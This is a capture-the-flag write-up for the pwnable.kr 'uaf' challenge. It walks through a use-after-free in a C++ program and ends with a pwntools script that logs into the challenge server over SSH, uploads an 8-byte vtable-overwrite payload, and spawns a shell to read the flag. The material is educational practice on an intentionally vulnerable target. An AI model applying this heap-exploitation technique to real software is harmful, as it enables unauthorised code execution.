# Overview

The C++ source code is provided:
```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

The program has a simple prompt:

![image](https://user-images.githubusercontent.com/17574533/213258352-5f714e50-e89b-4c37-9fc8-ca24e14a92d7.png)

## Option 1

Calls the `introduce` methods of Man `m` and Woman `w`

![image](https://user-images.githubusercontent.com/17574533/213817732-d639cd64-1a5f-472e-8190-c039995c2e29.png)

Source:

![image](https://user-images.githubusercontent.com/17574533/213259558-c5fb059b-0873-4199-8739-3d6913a09a0b.png)

## Option 2

Reads `argv[1]` bytes from file `argv[2]` into the buffer `data`

![image](https://user-images.githubusercontent.com/17574533/213817889-a7ff0e40-842b-47fb-ba7f-90b600d78658.png)

Source:

![image](https://user-images.githubusercontent.com/17574533/213817950-33d3ce45-5675-4698-8f6d-5cf229a324d3.png)

## Option 3

Frees frees `m` and `w` from the heap. No printed output.

Source:

![image](https://user-images.githubusercontent.com/17574533/213818392-8688383a-9335-421c-86c2-219d1a6f0546.png)

# Goal

Call `Human::give_shell()` and print the flag

![image](https://user-images.githubusercontent.com/17574533/213821928-10b16f7e-76e9-46c4-8244-c408c293bb42.png)


# Vulnerability

Dereferencing dangling pointers

Option 1 is allowed even after entering Option 3. This will dereference the dangling pointers `m` and `w`

# Observations

1. Since `Man` and `Woman` inherits `Human`, the vtable of `m` and `w` also contain an entry to `Human::give_shell()`. The entry is offset -8 from `::introduce()`

![image](https://user-images.githubusercontent.com/17574533/213825202-b1a11d02-9567-48f6-bd59-bb8186121df5.png)


2. Allocation of `m` and `w` consumes 4 chunks:
- "Jack" string is stored at chunk 0x614ea0
- `m` is stored at chunk 0x614ed0
- "Jill" string is stored at chunk 0x614ef0
- `w` is stored at chunk 0x614f20
- The first data of `m` and `w` is the vtable address

![image](https://user-images.githubusercontent.com/17574533/213845654-5f808902-5df1-4c8a-9059-c1cf0d88e653.png)

3. After freeing `m` and `w` through Option 3, all 4 chunks are freed

| Before Option 3 | After Option 3 |
| - | - |
| ![image](https://user-images.githubusercontent.com/17574533/213844416-311f9ea1-3f0e-4b53-b7ee-55b99a81410d.png) | ![image](https://user-images.githubusercontent.com/17574533/213844448-dcccbab1-ed98-4c46-8f7e-bb20892ed35f.png) |

# Exploit

After freeing `m` and `w`, write data in place of `m` and `w` such that the vtable is offset by -8. This way `Human::give_shell()` will be called instead of `::introduce()`.

![image](https://user-images.githubusercontent.com/17574533/213848490-b41e87d3-7fd9-4c3d-bcaa-1a7ffb8fe0b2.png)

Just overwriting `m`'s vtable (highlighted in image) is enough since we only need to call `give_shell()` once and man's function gets called first.

Note that the overwritten data must fit in the chunks of `m` and `w` which has the size 0x21. This is the minimum chunk size in 64 bit x86 anyway so let's write 8 bytes - just enough for the address.

Also note that since `m` is the second 0x21 chunk from top chunk, we have to allocate twice.

Concretely,
1. Calculate `Man`'s modified vtable address
`mod_vtable_addr` = 0x401570 - 8
2. Write to payload file as an 8 byte word
3. Execute `./uaf 8 {payload_file}`
4. Free memory through Option 3
5. Write data through Option 2 twice
6. Call `Human::give_shell()` through Option 1
7. `cat flag`

## Code
```python
from pwn import *

mod_vtable_addr = 0x401570 - 8
payload = p64(mod_vtable_addr)
with open("uaf_payload.txt", "wb") as f:
    f.write(payload)

remote_payload_location = "/tmp/uaf_payload.txt"
s = ssh("uaf", "pwnable.kr", 2222, "guest")
s.upload_data(payload, remote_payload_location)

p = s.system(f"./uaf 8 {remote_payload_location}")
p.sendline(b"3") # Free m and w
p.sendline(b"2") # Write address to w object
p.sendline(b"2") # Write address to m object
p.sendline(b"1") # Win
p.interactive()
```
